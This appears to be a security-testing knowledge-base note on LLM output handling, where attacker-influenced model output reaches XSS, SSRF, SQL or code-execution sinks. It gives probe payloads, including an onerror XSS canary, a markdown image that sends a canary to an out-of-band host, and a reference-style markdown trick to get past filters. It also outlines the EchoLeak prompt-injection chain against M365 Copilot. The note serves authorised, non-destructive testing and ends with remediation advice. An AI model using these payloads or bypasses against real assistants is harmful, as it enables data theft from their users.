# LLM Output Handling (model output as attacker input)

**Class:** AI application / injection  **Updated:** 2026-11-13

## What it is
The model's output is attacker-influenced (through prompt injection, see
`llm-prompt-injection.md`) and the application treats it as trusted. The bug is
not in the model: it is a classic class (XSS, SSRF, SQLi, code execution) with
a new delivery vector. Reuse the oracle of the class note; this file only adds
how the payload gets from the attacker into the sink.

## Sinks and where the oracle lives
| sink | symptom | oracle |
|---|---|---|
| chat UI renders model markdown/HTML/SVG raw | `<img onerror>`, `<svg onload>` in an answer executes | browser canary, `skills/stored-xss-oast`, `xss.md`, `client-side-dom.md` |
| markdown image or link unfurl auto-fetched by the client or a proxy | `![x](https://oast/<nonce>?d=<canary>)` loads with no click | OAST hit with nonce, the trifecta exfil leg |
| SQL or NoSQL agent builds queries from model text | model-written predicate reaches the DB | time/boolean oracle in `sql-injection.md` |
| model emits a URL that a server-side fetcher follows (browse tool, link preview, "summarise this URL") | fetcher hits attacker or internal host | OAST hit, then `ssrf.md` for the reach |
| code interpreter / "run this" tool | model-written code executes in a sandbox | no-op marker (`print(nonce)`) and an OAST DNS lookup, never filesystem or network pivots |
| model output stored then rendered to another user | stored XSS via the model | `stored-xss-oast` token per injection point |

## How Mythos detects it
Recon the render path first: does the UI use `innerHTML`, a markdown library
with raw HTML on, a sanitizer (DOMPurify config), a CSP with `img-src *`?
Read response headers for CSP; a strict `img-src` blocks the image channel
but not link unfurl or a fetch tool.

## How to confirm (non-destructive)
1. Ask the assistant to emit the carrier directly where policy allows
   ("reply with exactly this text"), and fall back to indirect delivery.
   Direct emission proves the sink, indirect delivery proves the chain.
2. Use a nonce per probe: `![](http://oast:8080/<nonce>)`, or the canary
   `<img src=x onerror=console.log('MYTHOS-XSS:<nonce>')>`.
3. Success is the sink-class oracle firing, not the string appearing in the
   chat. For image exfil, the OAST hit must arrive without any click by the
   viewing principal; a click-needed link is a weaker finding, say so.
4. Negative control: the same message with the markup HTML-escaped, or the
   URL as plain text. It must not fire.
5. Replay k=5 to 10 for any step that depends on the model emitting the
   payload; report the rate as in `llm-prompt-injection.md`.
Reference-style markdown (`![x][1]` plus `[1]: url`) is a filter-bypass
variant worth one extra probe when inline images are redacted.

## Case study: EchoLeak
CVE-2025-32711, CVSS 9.3, M365 Copilot, Aim Labs, public 2025-06-11. The
published chain: a crafted email, an XPIA classifier bypass, link redaction
bypassed with reference-style markdown, an auto-fetched image, and a Teams
proxy allowed by the CSP. Lesson for testing: each defence (classifier,
redaction, CSP) needs its own probe; passing one does not clear the rest.

## What does NOT count
The model writing markup in a reply to the tester's own prompt with no
execution; an image URL that never produced an OAST hit; an interpreter
printing its own output with no sandbox escape claim; execution only after the
victim pastes or clicks beyond what the product's normal use implies.

## Remediation
Render model output as untrusted: escape HTML, disable raw HTML in markdown,
proxy or block external images, strict CSP `img-src`/`connect-src`, no
auto-fetch of model-chosen URLs, parameterised queries for agent SQL, sandbox
code execution with no egress.

## Sources
- Reddy and Gujral, "EchoLeak: The First Real-World Zero-Click Prompt Injection Exploit in a Production LLM System", arXiv:2509.10540 (2025-09-06)
- CVE-2025-32711 CVSS 9.3 as reported by Aim Labs coverage (2025-06); the Aim Labs page itself returned 403 and was not read
- OWASP Top 10 for LLM Applications, LLM05 improper output handling (from tool knowledge, unverified)
